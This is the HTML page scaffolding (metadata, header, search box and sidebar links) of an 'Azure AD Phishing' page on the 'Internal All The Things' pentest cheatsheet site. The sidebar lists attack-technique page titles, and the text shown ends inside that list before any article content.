
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
      
      
      
        <link rel="canonical" href="https://hktalent.github.io/InternalAllTheThings/cloud/azure/azure-phishing/">
      
      
        <link rel="prev" href="../azure-persistence/">
      
      
        <link rel="next" href="../azure-requirements/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Azure AD Phishing - Internal All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Azure AD Phishing - Internal All The Things" >
      
        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  property="og:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/cloud/azure/azure-phishing.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://hktalent.github.io/InternalAllTheThings/cloud/azure/azure-phishing/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Azure AD Phishing - Internal All The Things" >
      
        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  name="twitter:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/cloud/azure/azure-phishing.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#azure-ad-phishing" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Internal All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Azure AD Phishing
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Internal All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal All The Things
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Active directory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Access Controls ACL/ACE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-enumerate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Group Policy Objects
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-groups/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Groups
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - NTDS Dumping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-rodc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Read Only Domain Controller
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Federation Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-integrated-dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Integrated DNS - ADIDNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-asrep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - ASREP Roasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Timeroasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/deployment-sccm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - SCCM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/deployment-wsus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - WSUS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-capture/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Capture and Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - OverPass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Pass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-dcom/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - DCOM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-mitm-relay/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - MITM and Relay
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - PXE Boot Image
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-shares/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - Shares
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Bronze Bit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Resource Based Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Unconstrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-s4u/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Service for User Extension
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-tickets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Tickets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-comments/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - AD User Comment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - DSRM Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Group Policy Preferences
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-precreated-computer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Pre-Created Computer Account
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-read-gmsa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - GMSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-read-laps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - LAPS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Shadow Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-spraying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Spraying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-pam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Privileged Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-relationship/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Relationship
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-sid-hijacking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Child Domain to Forest Compromise - SID Hijacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-ticket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forest to Forest Compromise - Trust Ticket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_42" >
        
          
          <label class="md-nav__link" for="__nav_2_42" id="__nav_2_42_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CVE
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_42_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_42">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/MS14-068/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MS14-068 Checksum Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/NoPAC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoPAC / samAccountName Spoofing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrintNightmare
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/PrivExchange/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrivExchange
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ZeroLogon
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cheatsheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/escape-breakout/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Application Escape and Breakout
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/hash-cracking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mimikatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Miscellaneous & Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/mssql-server-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MSSQL Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/network-discovery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Discovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Powershell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
